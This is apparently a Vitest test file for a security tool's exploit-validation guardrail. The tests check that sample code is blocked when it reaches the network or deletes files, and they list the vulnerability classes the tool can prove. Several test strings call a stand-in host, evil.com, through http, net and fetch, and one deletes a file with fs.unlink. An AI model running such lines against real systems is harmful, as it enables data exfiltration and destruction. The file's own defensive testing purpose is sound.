import { describe, it, expect } from 'vitest'
import { validateExploit, PROVABLE_VULN_CLASSES, SKIP_REASONS } from '../../src/security/prover.js'

describe('validateExploit — safety guardrails', () => {
  it('blocks http require (network access)', () => {
    const code = `const http = require('http'); http.get('http://evil.com', () => {})`
    const result = validateExploit(code)
    expect(result.safe).toBe(false)
    expect(result.reason).toContain('network access')
  })

  it('blocks https require (network access)', () => {
    const code = `const https = require('https'); https.request({})`
    const result = validateExploit(code)
    expect(result.safe).toBe(false)
    expect(result.reason).toContain('network access')
  })

  it('blocks net require (network access)', () => {
    const code = `const net = require('net'); net.createConnection(80, 'evil.com')`
    const result = validateExploit(code)
    expect(result.safe).toBe(false)
    expect(result.reason).toContain('network access')
  })

  it('blocks fetch() calls (network access)', () => {
    const code = `fetch('https://evil.com/data').then(r => r.text())`
    const result = validateExploit(code)
    expect(result.safe).toBe(false)
    expect(result.reason).toContain('network access')
  })

  it('blocks fs.unlink (filesystem write)', () => {
    const code = `const fs = require('fs'); fs.unlink('/important', () => {})`
    const result = validateExploit(code)
    expect(result.safe).toBe(false)
    expect(result.reason).toContain('filesystem writes')
  })

  it('allows safe local exploit code', () => {
    const code = `
      const { hashPassword } = require('./demo/prove-demo/auth')
      const hash = hashPassword('password')
      if (hash === '5f4dcc3b5aa765d61d8327deb882cf99') {
        console.log('EXPLOITED: MD5 is crackable')
      } else {
        console.log('NOT_EXPLOITED: unexpected hash')
      }
    `
    expect(validateExploit(code).safe).toBe(true)
  })
})

describe('PROVABLE_VULN_CLASSES', () => {
  it('includes MD5 as provable', () => {
    expect(PROVABLE_VULN_CLASSES.has('Weak Hash Algorithm (MD5)')).toBe(true)
  })

  it('includes both SQL injection variants', () => {
    expect(PROVABLE_VULN_CLASSES.has('SQL Injection — String Concat')).toBe(true)
    expect(PROVABLE_VULN_CLASSES.has('SQL Injection — Template Literal')).toBe(true)
  })

  it('includes eval, command injection, path traversal', () => {
    expect(PROVABLE_VULN_CLASSES.has('eval() Usage')).toBe(true)
    expect(PROVABLE_VULN_CLASSES.has('Command Injection')).toBe(true)
    expect(PROVABLE_VULN_CLASSES.has('Path Traversal')).toBe(true)
  })

  it('has exactly 17 entries', () => {
    expect(PROVABLE_VULN_CLASSES.size).toBe(17)
  })
})

describe('SKIP_REASONS', () => {
  it('marks K8s: Privileged Container with cluster reason', () => {
    expect(SKIP_REASONS['K8s: Privileged Container']).toContain('cluster')
  })

  it('marks Docker: Running as Root with skip reason', () => {
    expect(SKIP_REASONS['Docker: Running as Root']).toBeTruthy()
  })

  it('has exactly 12 entries', () => {
    expect(Object.keys(SKIP_REASONS).length).toBe(12)
  })
})
